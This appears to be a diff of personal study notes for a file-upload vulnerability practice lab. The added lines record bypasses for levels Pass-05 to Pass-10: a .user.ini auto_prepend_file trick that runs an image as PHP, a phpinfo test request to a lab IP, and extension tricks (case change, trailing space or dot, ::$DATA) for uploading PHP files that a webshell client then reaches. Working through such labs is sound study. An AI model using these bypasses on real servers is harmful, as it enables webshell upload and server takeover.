@@ -3,6 +3,7 @@
 	
 	https://blog.csdn.net/weixin_44677409/article/details/92799366
 	
+	https://blog.csdn.net/weixin_44426869/article/details/104236854
 	
 Pass-01
 	<form enctype="multipart/form-data" method="post" onsubmit="return checkFile()">
@@ -25,14 +26,31 @@ Pass-04
 			1.php999
 	
 Pass-05
-
-
-
+	Server API -> FastCGI
+		.user.ini ->   auto_prepend_file=1.gif
+			1.gif ->   <?php phpinfo(); ?>
+				http://1.117.162.201/upload/Pass-05/index.php/upload/readme.php   data=phpinfo();
+			
 Pass-06
+	!strtolower();
+		1.PHP  //虽然上传成功,蚁剑不能解析1.pHp
+
 Pass-07
+	!trim();
+		"1.php "  //虽然上传成功,蚁剑不能解析1.php 直接未知文件
+	
 Pass-08
+	!deldot();
+		1.php.   //虽然上传成功,蚁剑不能解析1.php.直接未知文件
+		
 Pass-09
+	!str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+		1.php::$DATA
+		
 Pass-10
+	$img_path = UPLOAD_PATH.'/'.$file_name;
+		1.php. .
+		
 Pass-11
 Pass-12
 Pass-13
